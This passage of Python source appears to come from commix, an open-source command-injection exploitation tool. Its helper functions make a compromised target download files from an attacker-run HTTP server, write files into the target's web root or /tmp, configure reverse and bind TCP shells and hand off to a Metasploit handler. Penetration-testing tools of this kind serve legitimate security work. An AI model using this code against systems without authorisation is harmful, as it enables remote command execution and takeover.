  dest_to_write = check_destination(destination=menu.options.file_dest)
  info_msg = "Attempting to write the contents of file '"
  info_msg += file_to_write + "' to the remote directory '" + dest_to_write + "'."
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  return file_to_write, dest_to_write, content

"""
Display the result of an attempted file write to the remote target.
"""
def file_write_status(shell, dest_to_write):
  if shell:
    info_msg = "The file has been successfully created in remote directory: '" + dest_to_write + "'."
    settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
  else:
    warn_msg = "It seems you do not have permission to write files to the remote directory '" + dest_to_write + "'."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Handle the file upload process to a remote target.
"""
def check_file_to_upload():
  file_to_upload = menu.options.file_upload.encode(settings.DEFAULT_CODEC).decode()
  try:
    _urllib.request.urlopen(file_to_upload, timeout=settings.TIMEOUT)
  except (_urllib.error.HTTPError, _urllib.error.URLError) as err_msg:
    warn_msg = "The remote file '" + file_to_upload + "' does not appear to exist. (" +str(err_msg)+ ")"
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
    raise SystemExit()
  except ValueError as err_msg:
    err_msg = str(err_msg[0]).capitalize() + str(err_msg)[1]
    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
    raise SystemExit()
  dest_to_upload = check_destination(destination=menu.options.file_dest)
  info_msg = "Attempting to upload the file '"
  info_msg += file_to_upload + "' to the remote directory '" + dest_to_upload + "'."
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  # Execute command
  cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload
  return cmd, dest_to_upload

"""
File upload status.
"""
def file_upload_status(shell, dest_to_upload):
  if shell:
    info_msg = "The file has been successfully uploaded on remote directory '" + dest_to_upload + "'."
    settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
  else:
    warn_msg = "It seems you do not have permission to upload files on the remote directory '" + dest_to_upload + "'."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Check if defined "--file-upload" option.
"""
def file_upload():
  if not re.match(settings.VALID_URL_FORMAT, menu.options.file_upload):
    # if not menu.options.file_dest.endswith("/"):
    #   menu.options.file_dest = menu.options.file_dest + "/"
    # Check if not defined URL for upload.
    while True:
      message = "Do you want to enable a local HTTP server? [Y/n] > "
      enable_HTTP_server = common.read_input(message, default="Y", check_batch=True)
      if enable_HTTP_server in settings.CHOICE_YES:

        # Check if file exists
        if not os.path.isfile(menu.options.file_upload):
          err_msg = "The '" + menu.options.file_upload + "' file, does not exist."
          settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
          raise SystemExit()

        # Setting the local HTTP server.
        if settings.LOCAL_HTTP_IP == None:
          while True:
            message = "Please enter your interface IP address > "
            ip_addr = common.read_input(message, default=None, check_batch=True)
            # check if IP address is valid
            ip_check = simple_http_server.is_valid_ipv4(ip_addr)
            if ip_check == False:
              err_msg = "The provided IP address seems not valid."
              settings.print_data_to_stdout(settings.print_error_msg(err_msg))
              pass
            else:
              settings.LOCAL_HTTP_IP = ip_addr
              break

        # Check for invalid HTTP server's port.
        if settings.LOCAL_HTTP_PORT < 1 or settings.LOCAL_HTTP_PORT > 65535:
          err_msg = "Invalid HTTP server's port (" + str(settings.LOCAL_HTTP_PORT) + ")."
          settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
          raise SystemExit()

        http_server = "http://" + str(settings.LOCAL_HTTP_IP) + ":" + str(settings.LOCAL_HTTP_PORT)
        info_msg = "Setting the HTTP server on '" + http_server + "/'. "
        settings.print_data_to_stdout(settings.print_info_msg(info_msg))
        menu.options.file_upload = http_server + menu.options.file_upload
        simple_http_server.main()
        break

      elif enable_HTTP_server in settings.CHOICE_NO:
        if not re.match(settings.VALID_URL_FORMAT, menu.options.file_upload):
          err_msg = "The provided '--file-upload' option requires the activation of a local HTTP server."
          settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
          raise SystemExit()
        break
      elif enable_HTTP_server in settings.CHOICE_QUIT:
        raise SystemExit()
      else:
        common.invalid_option(enable_HTTP_server)
        pass

def define_vulnerable_http_header(http_header_name):
  if http_header_name == settings.USER_AGENT.lower():
    settings.USER_AGENT_INJECTION = True
  elif http_header_name == settings.REFERER.lower():
    settings.REFERER_INJECTION = True
  elif http_header_name == settings.HOST.lower():
    settings.HOST_INJECTION = True
  return http_header_name

"""
Check for wrong flags
"""
def check_wrong_flags():
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if menu.options.is_root :
      warn_msg = "Switching '--is-root' to '--is-admin' because the "
      warn_msg += "target has been identified as Windows."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
    if menu.options.passwords:
      warn_msg = "The '--passwords' option is not yet supported on Windows targets."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
    if menu.options.file_upload :
      warn_msg = "The '--file-upload' option is not yet supported on Windows targets. "
      warn_msg += "Instead, use the '--file-write' option."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
      raise SystemExit()
  else:
    if menu.options.is_admin :
      warn_msg = "Switching '--is-admin' to '--is-root' because "
      warn_msg += "the target has been identified as Unix-like. "
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Set writable path name
"""
def setting_writable_dir(path):
    if settings.VERBOSITY_LEVEL != 0:
      debug_msg = "Using '" + path + "' for writable directory."
      settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
    info_msg = "Attempting to create a file in directory '" + path
    info_msg += "' for command execution output. "
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))

"""
Define python working dir (for windows targets)
"""
def define_py_working_dir():
  if settings.TARGET_OS == settings.OS.WINDOWS and menu.options.alter_shell:
    while True:
      message = "Do you want to use '" + settings.WIN_PYTHON_INTERPRETER
      message += "' as Python working directory on the target host? [Y/n] > "
      python_dir = common.read_input(message, default="Y", check_batch=True)
      if python_dir in settings.CHOICE_YES:
        break
      elif python_dir in settings.CHOICE_NO:
        message = "Please provide a custom working directory for Python (e.g. '"
        message += settings.WIN_PYTHON_INTERPRETER + "') > "
        settings.WIN_PYTHON_INTERPRETER = common.read_input(message, default=None, check_batch=True)
        break
      else:
        common.invalid_option(python_dir)
        pass
    settings.USER_DEFINED_PYTHON_DIR = True

"""
Checks for identified vulnerable parameter
"""
def identified_vulnerable_param(url, technique, injection_type, vuln_parameter, payload, http_request_method, filename, export_injection_info, vp_flag, counter):
  # Check injection state
  settings.DETECTION_PHASE = False
  settings.EXPLOITATION_PHASE = True
  if settings.COOKIE_INJECTION == True:
    header_name = settings.SINGLE_WHITESPACE + settings.COOKIE
    found_vuln_parameter = vuln_parameter
    the_type = " parameter"

  elif settings.USER_AGENT_INJECTION == True:
    header_name = settings.SINGLE_WHITESPACE + settings.USER_AGENT
    found_vuln_parameter = ""
    the_type = " HTTP header"

  elif settings.REFERER_INJECTION == True:
    header_name = settings.SINGLE_WHITESPACE + settings.REFERER
    found_vuln_parameter = ""
    the_type = " HTTP header"

  elif settings.HOST_INJECTION == True:
    header_name = settings.SINGLE_WHITESPACE + settings.HOST
    found_vuln_parameter = ""
    the_type = " HTTP header"

  elif settings.CUSTOM_HEADER_INJECTION == True:
    header_name = settings.SINGLE_WHITESPACE + settings.CUSTOM_HEADER_NAME
    found_vuln_parameter = ""
    the_type = " HTTP header"

  else:
    header_name = ""
    the_type = " parameter"
    # Check if defined POST data
    if not settings.USER_DEFINED_POST_DATA or settings.IGNORE_USER_DEFINED_POST_DATA:
      found_vuln_parameter = parameters.vuln_GET_param(url)
    else :
      found_vuln_parameter = vuln_parameter

  if len(found_vuln_parameter) != 0 :
    found_vuln_parameter = " '" +  found_vuln_parameter + Style.RESET_ALL  + Style.BRIGHT + "'"

  # Print the findings to log file.
  if export_injection_info == False:
    export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
  if vp_flag == True:
    vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)
  logs.update_payload(filename, counter, payload)
  counter = counter + 1

  if not settings.LOAD_SESSION:
    if settings.VERBOSITY_LEVEL == 0:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
    else:
      total_of_requests()

  # Print the findings to terminal.
  info_msg = settings.CHECKING_PARAMETER + " appears to be injectable via "
  info_msg += "(" + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ") " + technique + "."
  settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
  sub_content = str(url_decode(payload))
  settings.print_data_to_stdout(settings.print_sub_content(sub_content))

"""
Finalize injection process
"""
def finalize(exit_loops, no_result, float_percent, injection_type, technique, shell):
  if exit_loops == False:
    if settings.VERBOSITY_LEVEL == 0:
      percent = print_percentage(float_percent, no_result, shell)
      injection_process(injection_type, technique, percent)
      return True
    else:
      return True
  else:
    return False

"""
Provide custom server's root directory
"""
def custom_web_root(url, timesec, filename, http_request_method, url_time_response):
  if not settings.CUSTOM_WEB_ROOT:
    if settings.TARGET_OS == settings.OS.WINDOWS :
      default_root_dir = settings.WINDOWS_DEFAULT_DOC_ROOTS[0]
    else:
      default_root_dir = settings.LINUX_DEFAULT_DOC_ROOTS[0].replace(settings.DOC_ROOT_TARGET_MARK,settings.TARGET_URL)
    message = "Enter a writable directory to use for file operations (e.g. '"
    message += default_root_dir + "') > "
    settings.WEB_ROOT = common.read_input(message, default=default_root_dir, check_batch=True)
    if len(settings.WEB_ROOT) == 0:
      settings.WEB_ROOT = default_root_dir
    settings.CUSTOM_WEB_ROOT = True

  if not settings.LOAD_SESSION:
    path = settings.WEB_ROOT
    setting_writable_dir(path)
  menu.options.web_root = settings.WEB_ROOT.strip()


"""
Return TEMP path for win / *nix targets.
"""
def check_tmp_path(url, timesec, filename, http_request_method, url_time_response):
  def check_trailing_slashes():
    if settings.TARGET_OS == settings.OS.WINDOWS and not menu.options.web_root.endswith("\\"):
      menu.options.web_root = settings.WEB_ROOT = menu.options.web_root + "\\"
    elif not menu.options.web_root.endswith("/"):
      menu.options.web_root = settings.WEB_ROOT = menu.options.web_root + "/"

  # Set temp path
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if "microsoft-iis" in settings.SERVER_BANNER.lower():
      settings.TMP_PATH = r"C:\\Windows\TEMP\\"
    else:
      settings.TMP_PATH = "%temp%\\"
  else:
    settings.TMP_PATH = "/tmp/"

  if menu.options.tmp_path:
    tmp_path = menu.options.tmp_path
  else:
    tmp_path = settings.TMP_PATH

  if not settings.LOAD_SESSION and settings.DEFAULT_WEB_ROOT != settings.WEB_ROOT:
    settings.WEB_ROOT = settings.DEFAULT_WEB_ROOT

  if menu.options.file_dest and '/tmp/' in menu.options.file_dest:
    call_tmp_based = True

  if menu.options.web_root:
    settings.WEB_ROOT = menu.options.web_root
  else:
    # Provide custom server's root directory.
    custom_web_root(url, timesec, filename, http_request_method, url_time_response)

  if settings.TARGET_OS == settings.OS.WINDOWS:
    settings.WEB_ROOT = settings.WEB_ROOT.replace("/","\\")
  check_trailing_slashes()

  return tmp_path

"""
Check if file-based technique has failed,
then use the "/tmp/" directory for tempfile-based technique.
"""
def tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response):
  if no_result == True:
    from src.core.injections.semiblind.techniques.tempfile_based import tfb_handler
    path = tmp_path
    setting_writable_dir(path)
    call_tfb = tfb_handler.exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response)
    return call_tfb
  else:
    settings.print_data_to_stdout(settings.END_LINE.CR)

"""
Check if to use the "/tmp/" directory for tempfile-based technique.
"""
def use_temp_folder(no_result, url, timesec, filename, http_request_method, url_time_response):
  tmp_path = check_tmp_path(url, timesec, filename, http_request_method, url_time_response)
  settings.print_data_to_stdout(settings.END_LINE.CR)
  while True:
    message = "Insufficient permissions on directory '" + settings.WEB_ROOT + "'. "
    # if not menu.options.web_root:
    #   message += " You are advised to rerun with option '--web-root'."
    message += "Do you want to use '" + tmp_path + "' instead? [Y/n] > "
    tmp_upload = common.read_input(message, default="Y", check_batch=True)
    if tmp_upload in settings.CHOICE_YES:
      exit_loops = True
      settings.TEMPFILE_BASED_STATE = True
      call_tfb = tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response)
      if call_tfb != False:
        return True
      else:
        if no_result == True:
          return False
        else:
          return True
    elif tmp_upload in settings.CHOICE_NO:
      break
    elif tmp_upload in settings.CHOICE_QUIT:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
      raise
    else:
      common.invalid_option(tmp_upload)
      pass
  # continue

"""
Adjusts the timesec delay
"""
def time_related_timesec():
  min_safe_delay = 0.5  # minimum safe delay
  if settings.TIME_RELATED_ATTACK and settings.TIMESEC < min_safe_delay:
    warn_msg = "Adjusting '--time-sec' to minimum safe delay of '" + str(min_safe_delay) + "'."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
    return min_safe_delay
  else:
    return max(settings.TIMESEC, min_safe_delay)

"""
Export the time related injection results
"""
def time_related_export_injection_results(cmd, separator, output, check_exec_time):
  if settings.VERBOSITY_LEVEL == 0:
    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
  if output != "" and check_exec_time != 0 :
    info_msg = "Finished in " + time.strftime('%H:%M:%S', time.gmtime(check_exec_time)) + "."
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
    # settings.print_data_to_stdout(settings.print_output(output))
  else:
    # Check for separator filtration on target host.
    if output != False :
      err_msg = "It seems '" + cmd + "' command could not return "
      err_msg += "any output due to '" + separator + "' filtration on target host. "
      err_msg += "To bypass that limitation, use the '--alter-shell' option "
      err_msg += "or try another injection technique."
      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
    # Check for invalid provided command.
    else:
      err_msg = common.invalid_cmd_output(cmd)
      settings.print_data_to_stdout(settings.print_error_msg(err_msg))

"""
Success msg.
"""
def shell_success(option):
  info_msg = "Sending payload to target, for " + option + " TCP connection "
  if settings.BIND_TCP:
    info_msg += "against " + settings.RHOST 
  else:
    info_msg += "on " + settings.LHOST 
  info_msg += ":" + settings.LPORT + "."
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))

"""
Payload generation message.
"""
def gen_payload_msg(payload):
  info_msg = "Generating the '" + payload + "' shellcode. "
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  
"""
Error msg if the attack vector is available only for Windows targets.
"""
def windows_only_attack_vector():
    error_msg = "This attack vector is available only for Windows targets."
    settings.print_data_to_stdout(settings.print_error_msg(error_msg))

"""
Message regarding the MSF handler.
"""
def msf_launch_msg(output):
    info_msg = "Type \"msfconsole -r " + os.path.abspath(output) + "\" (in a new window)."
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
    info_msg = "Once the loading is done, press here any key to continue..."
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
    sys.stdin.readline().replace("\n", "")
    # Remove the ouput file.
    os.remove(output)

"""
Check for available shell options.
"""
def shell_options(option):
  if option.lower() == "reverse_tcp" or option.lower() == "bind_tcp" :
    warn_msg = "You are into the '" + option.lower() + "' mode."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
  elif option.lower() == "?":
    menu.reverse_tcp_options()
  elif option.lower() == "quit" or option.lower() == "exit":
    raise SystemExit()

  elif option[0:4].lower() == "set ":
    if option[4:10].lower() == "lhost ":
      if option.lower() == "bind_tcp":
        err_msg =  "The '" + option[4:9].upper() + "' option, is not "
        err_msg += "usable for '" + option.lower() + "' mode. Use 'RHOST' option."
        settings.print_data_to_stdout(settings.print_error_msg(err_msg))
      else:
        check_lhost(option[10:])
    if option[4:10].lower() == "rhost ":
      if option.lower() == "reverse_tcp":
        err_msg =  "The '" + option[4:9].upper() + "' option, is not "
        err_msg += "usable for '" + option.lower() + "' mode. Use 'LHOST' option."
        settings.print_data_to_stdout(settings.print_error_msg(err_msg))
      else:
        check_rhost(option[10:])
    if option.lower() == "reverse_tcp":    
      if option[4:10].lower() == "lport ":
        check_lport(option[10:])
      if option[4:12].lower() == "srvport ":
        check_srvport(option[12:])
      if option[4:12].lower() == "uripath ":
        check_uripath(option[12:])
  else:
    return option

"""
Set up the PHP working directory on the target host.
"""
def set_php_working_dir():
  while True:
    message = "Do you want to use '" + settings.WIN_PHP_DIR
    message += "' as PHP working directory on the target host? [Y/n] > "
    php_dir = common.read_input(message, default="Y", check_batch=True)
    if php_dir in settings.CHOICE_YES:
      break
    elif php_dir in settings.CHOICE_NO:
      message = "Please provide a custom working directory for PHP (e.g. '" + settings.WIN_PHP_DIR + "') > "
      settings.WIN_PHP_DIR = common.read_input(message, default=settings.WIN_PHP_DIR, check_batch=True)
      settings.USER_DEFINED_PHP_DIR = True
      break
    else:
      common.invalid_option(php_dir)
      pass

"""
Set up the Python working directory on the target host.
"""
def set_python_working_dir():
  while True:
    message = "Do you want to use '" + settings.WIN_PYTHON_INTERPRETER
    message += "' as Python interpreter on the target host? [Y/n] > "
    python_dir = common.read_input(message, default="Y", check_batch=True)
    if python_dir in settings.CHOICE_YES:
      break
    elif python_dir in settings.CHOICE_NO:
      message = "Please specify the full path to the Python interpreter executable (e.g., '" + settings.WIN_CUSTOM_PYTHON_INTERPRETER  + "') > "
      settings.WIN_PYTHON_INTERPRETER = common.read_input(message, default=settings.WIN_CUSTOM_PYTHON_INTERPRETER, check_batch=True)
      settings.USER_DEFINED_PYTHON_DIR = True
      break
    else:
      common.invalid_option(python_dir)
      pass

"""
Check if to use '/bin' standard subdirectory
"""
def use_bin_subdir(nc_alternative, shell):
  while True:
    message = "Do you want to use '/bin' standard subdirectory? [y/N] > "
    enable_bin_subdir = common.read_input(message, default="N", check_batch=True)
    if enable_bin_subdir in settings.CHOICE_YES :
      nc_alternative = "/bin/" + nc_alternative
      shell = "/bin/" + shell
      return nc_alternative, shell
    elif enable_bin_subdir in settings.CHOICE_NO:
      return nc_alternative, shell
    elif enable_bin_subdir in settings.CHOICE_QUIT:
      raise SystemExit()
    else:
      common.invalid_option(enable_bin_subdir)
      pass

"""
Set up the Python interpreter on linux target host.
"""
def set_python_interpreter():
  while True:
    message = "Do you want to use '" + settings.LINUX_PYTHON_INTERPRETER
    message += "' as Python interpreter on the target host? [Y/n] > "
    python_interpreter = common.read_input(message, default="Y", check_batch=True)
    if python_interpreter in settings.CHOICE_YES:
      break
    elif python_interpreter in settings.CHOICE_NO:
      message = "Please specify the full filesystem path of a custom Python interpreter to use (e.g. '" + settings.LINUX_CUSTOM_PYTHON_INTERPRETER + "') > "
      settings.LINUX_PYTHON_INTERPRETER = common.read_input(message, default=settings.LINUX_CUSTOM_PYTHON_INTERPRETER, check_batch=True)
      settings.USER_DEFINED_PYTHON_INTERPRETER = True
      break
    else:
      common.invalid_option(python_interpreter)
      pass

"""
check / set rhost option for bind TCP connection
"""
def check_rhost(rhost):
  settings.RHOST = rhost
  settings.print_data_to_stdout("RHOST => " + settings.RHOST)
  return True

"""
check / set lhost option for reverse TCP connection
"""
def check_lhost(lhost):
  settings.LHOST = lhost
  settings.print_data_to_stdout("LHOST => " + settings.LHOST)
  return True

"""
check / set lport option for reverse TCP connection
"""
def check_lport(lport):
  try:
    if float(lport):
      settings.LPORT = lport
      settings.print_data_to_stdout("LPORT => " + settings.LPORT)
      return True
  except ValueError:
    err_msg = "The provided port must be numeric (i.e. 1234)"
    settings.print_data_to_stdout(settings.print_error_msg(err_msg))
    return False

"""
check / set srvport option for reverse TCP connection
"""
def check_srvport(srvport):
  try:
    if float(srvport):
      settings.SRVPORT = srvport
      settings.print_data_to_stdout("SRVPORT => " + settings.SRVPORT)
      return True
  except ValueError:
    err_msg = "The provided port must be numeric (i.e. 1234)"
    settings.print_data_to_stdout(settings.print_error_msg(err_msg))
    return False

"""
check / set uripath option for reverse TCP connection
"""
def check_uripath(uripath):
  settings.URIPATH = uripath
  settings.print_data_to_stdout("URIPATH => " + settings.URIPATH)
  return True
  
# eof